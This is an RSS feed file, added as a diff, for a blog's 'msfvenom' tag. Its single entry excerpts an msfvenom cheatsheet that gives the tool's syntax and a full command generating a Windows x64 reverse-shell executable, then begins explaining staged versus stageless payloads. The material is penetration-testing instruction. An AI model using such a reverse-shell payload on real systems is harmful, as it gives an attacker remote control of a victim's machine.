@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>msfvenom on [KafkaEsc]</title>
+    <link>https://kafkaesc.com/tags/msfvenom/</link>
+    <description>Recent content in msfvenom on [KafkaEsc]</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Tue, 30 Aug 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kafkaesc.com/tags/msfvenom/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>msfvenom Cheatsheet</title>
+      <link>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</link>
+      <pubDate>Tue, 30 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://kafkaesc.com/posts/2022/08/msfvenom-cheatsheet/</guid>
+      <description>The standard syntax for msfvenom is as follows:
+msfvenom -p &amp;lt;PAYLOAD&amp;gt; &amp;lt;OPTIONS&amp;gt;
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&amp;lt;listen-IP&amp;gt; LPORT=&amp;lt;listen-port&amp;gt;
+Staged vs Stageless There are two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.
+  Staged payloads are sent in two parts. The first part is called the stager.</description>
+    </item>
+    
+  </channel>
+</rss>
